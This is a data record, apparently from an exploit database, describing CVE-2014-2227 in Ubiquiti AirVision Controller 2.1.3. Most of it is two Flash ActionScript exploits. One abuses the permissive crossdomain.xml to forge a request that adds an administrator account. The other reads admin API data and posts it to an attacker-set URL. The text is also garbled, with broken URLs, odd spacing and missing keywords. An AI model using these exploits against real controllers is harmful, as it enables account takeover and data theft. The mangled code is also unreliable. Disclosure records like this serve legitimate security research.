{
    "text": "vul_name : Ubiquiti AirVision Controller 2.1.3 Weak Settings ， vul_cve : CVE-2014-2227 ， vul_poc : - ， Vendor :  ， Ubiquiti Networks (  ， Affected Products/Versions :  ， AirVision Controller v2.1.3 ， Note : Previous versions may be affected ， Description :  ， Title : Overly Permissive default crossdomain.xml file ， CVE : CVE-2014-2227 ， CWE :  ， Detailed writeup :  ， Researcher : Seth Art - @ sethsec ， POC # 1 : Using crossdomain.xml to execute CSRF and add an administrator :  ， / Customized AirVision POC Author : Seth Art ( sethsec at gmail.com )  ， / POC Template Author : Gursev Singh Kalra ( gursev.kalra at foundstone.com )  ， / POC Template Author's github :  ， package { ， public class XDomainXploit3 extends Sprite { ， public function XDomainXploit3 (  ) { ， / Target URL from where the data is to be retrieved ， var readFrom : String = \"https/victim : 7443/api/2.0/admin\" ;  ， var header : URLRequestHeader = new URLRequestHeader ( \"Content-Type\" ,  ， \"text/plain ; charset=UTF-8\" )  ;  ， var readRequest : URLRequest = new URLRequest ( readFrom )  ;  ， readRequest.method = URLRequestMethod.POST ， readRequest.data = ， \"{\\\"name\\\" : \\\"csrf-cdp\\\" , \\\"email\\\" : \\\"csrf-cdp @ gmail.com\\\" , \\\"userGroup\\\" : \\\"admin\\\" , \\\"x_password\\\" : \\\"password\\\" , \\\"confirmPassword\\\" : \\\"password\\\" , \\\"disabled\\\" : false}\" ;  ， readRequest.requestHeaders.push ( header )  ;  ， var getLoader : URLLoader = new URLLoader (  )  ;  ， getLoader.addEventListener ( Event.COMPLETE , eventHandler )  ;  ， getLoader.load ( readRequest )  ;  ， } catch ( error : Error ) { ， trace ( \"Error loading URL : \" + error )  ;  ， } ， } ， private function eventHandler ( event : Event )  : void { ， / URL to which retrieved data is to be sent ， var sendTo : String = \" ， var sendRequest : URLRequest = new URLRequest ( sendTo )  ;  ， sendRequest.method = URLRequestMethod.POST ;  ， sendRequest.data = event.target.data ;  ， var sendLoader : URLLoader = new URLLoader (  )  ;  ， sendLoader.load ( sendRequest )  ;  ， } catch ( error : Error ) { ， trace ( \"Error loading URL : \" + error )  ;  ， } ， } ， } ， } ， POC # 2 : Using crossdomain.xml to exfiltrate log data :  ， / Customized AirVision POC Author : Seth Art ( sethsec at gmail.com )  ， / POC Template Author : Gursev Singh Kalra ( gursev.kalra at foundstone.com )  ， / POC Template Author's github :  ， package { ， public class XDomainXploit extends Sprite { ， public function XDomainXploit (  ) { ， / Target URL from where the data is to be retrieved ， var readFrom : String = \"/victim : 7443/api/2.0/admin\" ;  ， var readRequest : URLRequest = new URLRequest ( readFrom )  ;  ， var getLoader : URLLoader = new URLLoader (  )  ;  ， getLoader.addEventListener ( Event.COMPLETE , eventHandler )  ;  ， getLoader.load ( readRequest )  ;  ， } catch ( error : Error ) { ， trace ( \"Error loading URL : \" + error )  ;  ， } ， } ， private function eventHandler ( event : Event )  : void { ， / URL to which retrieved data is to be sent ， var sendTo : String = \" ， var sendRequest : URLRequest = new URLRequest ( sendTo )  ;  ， sendRequest.method = URLRequestMethod.POST ;  ， sendRequest.data = event.target.data ;  ， var sendLoader : URLLoader = new URLLoader (  )  ;  ， sendLoader.load ( sendRequest )  ;  ， } catch ( error : Error ) { ， trace ( \"Error loading URL : \" + error )  ;  ， } ， } ， } ， }",
    "time": "2014.07.25"
}